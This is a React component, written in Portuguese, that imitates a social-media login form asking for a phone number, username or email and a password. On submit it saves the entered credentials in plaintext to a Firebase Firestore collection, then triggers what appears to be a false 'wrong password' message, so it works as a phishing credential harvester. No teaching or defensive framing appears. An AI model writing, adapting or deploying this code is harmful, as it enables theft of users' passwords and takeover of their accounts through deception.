import { addDoc, collection } from "firebase/firestore";
import { databaseApp } from "../../Services/FireStoreConfig";
import { useState } from "react";
import style from "./Formulario.module.css";
import { v4 as uuidv4 } from 'uuid';


const Formulario = ({senhaErrada}) => {

    const [email, Setemail] = useState("");
    const [senha, setSenha] = useState("");

    const referencia = collection(databaseApp, `${uuidv4()}`);
    const enviarDB = async (e) => {
        console.log("ate aqui ta indo")
        await addDoc(referencia, {
            email: email,
            senha: senha
        });
        setSenha("");
    }
    
    return (
        <form onSubmit={(e) => {
            e.preventDefault()
            enviarDB();
            senhaErrada(4)
        }} className={style.formulario}>
            <input className={style.inpt}
                value={email}
                onChange={(e) => Setemail(e.target.value)}
                type="text"
                required
                placeholder="  Telefone, nome de usuário ou email"
            />
            <input className={style.inpt}
                value={senha}
                onChange={(e) => setSenha(e.target.value)}
                type="password"
                placeholder="  Senha"
                required
            />
            <button>Entrar</button>
        </form>)
}
export default Formulario;